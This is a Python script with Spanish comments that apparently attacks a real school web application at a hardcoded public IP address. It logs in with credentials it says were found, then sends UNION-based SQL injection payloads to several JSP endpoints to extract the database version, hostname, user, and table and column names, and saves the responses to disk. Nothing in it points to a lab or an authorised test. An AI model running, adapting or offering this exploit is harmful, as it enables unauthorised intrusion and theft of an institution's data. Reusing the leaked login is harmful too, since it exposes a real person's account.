import requests
import re

class DatabaseExtractor:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
        # Usar credenciales encontradas
        self.session.post(f"{target}/jsp/index.jsp", 
                         data={'yAccion': 'login', 'yUsuario': 'hnieto', 
                               'xUsuario': 'hnieto', 'xContrasena': 'utslp', 'yIntentos': '1'})
    
    def extract_database_info(self):
        """Extraer información de la base de datos através de la aplicación"""
        print("[+] Extrayendo información de la base de datos...")
        
        # Probar diferentes endpoints que podrían mostrar información de BD
        endpoints = [
            '/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=',
            '/jsp/admin/estadisticas.jsp',
            '/jsp/configuracion/database_config.jsp',
            '/jsp/reportes/connection_test.jsp'
        ]
        
        sql_payloads = [
            "1' UNION SELECT @@version,@@hostname,database()-- ",
            "1' UNION SELECT user(),current_user,session_user()-- ",
            "1' UNION SELECT table_name,table_schema,3 FROM information_schema.tables-- ",
            "1' UNION SELECT column_name,data_type,3 FROM information_schema.columns WHERE table_name='users'-- "
        ]
        
        for endpoint in endpoints:
            print(f"\n🔍 Probando endpoint: {endpoint}")
            
            for payload in sql_payloads:
                try:
                    if '?' in endpoint:
                        url = f"{self.target}{endpoint}{payload}"
                    else:
                        url = f"{self.target}{endpoint}?param={payload}"
                    
                    response = self.session.get(url, timeout=10)
                    
                    if response.status_code == 200:
                        # Buscar información de BD en la respuesta
                        content = response.text.lower()
                        
                        if any(db_word in content for db_word in ['mysql', 'oracle', 'sqlserver', 'postgresql']):
                            print(f"   🚨 TIPO DE BD DETECTADO: {response.text[:500]}...")
                        
                        if 'root' in content or 'localhost' in content:
                            print(f"   🚨 INFO DEL SERVIDOR: {response.text[:500]}...")
                            
                        # Guardar respuesta interesante
                        if len(response.text) > 100 and len(response.text) < 10000:
                            filename = f"db_response_{endpoint.split('/')[-1]}.txt"
                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(response.text)
                            print(f"   💾 Respuesta guardada: {filename}")
                            
                except Exception as e:
                    print(f"   ❌ Error: {e}")

# Ejecutar
extractor = DatabaseExtractor("http://189.254.143.102")
extractor.extract_database_info()